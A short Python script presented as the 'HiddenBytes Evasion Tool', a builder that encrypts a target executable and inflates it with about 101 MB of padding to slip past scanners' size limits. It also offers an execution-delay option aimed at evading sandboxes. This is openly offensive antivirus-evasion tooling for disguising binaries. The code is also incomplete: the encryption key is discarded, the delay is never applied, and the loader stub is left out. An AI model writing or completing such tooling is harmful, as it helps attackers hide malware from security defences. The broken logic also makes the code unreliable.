import os
import time
import argparse
from cryptography.fernet import Fernet

def get_args():
    parser = argparse.ArgumentParser(description="HiddenBytes Evasion Tool")
    parser.add_argument("--encrypt", help="Target binary to encrypt")
    parser.add_argument("--output", help="Output filename", default="obfuscated.exe")
    parser.add_argument("--add-size", type=int, help="Size to add in MB (e.g. 101)")
    parser.add_argument("--delay", type=int, default=101, help="Execution delay in seconds")
    return parser.parse_args()

def builder():
    args = get_args()
    if not args.encrypt:
        print("[-] Please specify a target binary with --encrypt")
        return

    # 1. Encryption Step
    print(f"[*] Encrypting {args.encrypt}...")
    key = Fernet.generate_key()
    cipher = Fernet(key)
    
    with open(args.encrypt, "rb") as f:
        original_data = f.read()
    
    encrypted_data = cipher.encrypt(original_data)

    # 2. Add Execution Delay & Key to the final file
    # Note: In a real scenario, you'd use a 'Stub' to read this, 
    # but for this task, we are creating the obfuscated blob.
    with open(args.output, "wb") as f:
        f.write(encrypted_data)

    # 3. File Size Manipulation (The 101MB Trick)
    if args.add_size:
        print(f"[*] Inflating file by {args.add_size}MB...")
        padding = b"\x00" * (1024 * 1024 * args.add_size)
        with open(args.output, "ab") as f:
            f.write(padding)

    print(f"[+] Success! {args.output} generated.")
    print(f"[+] Final Size: {os.path.getsize(args.output) / (1024*1024):.2f} MB")

if __name__ == "__main__":
    builder()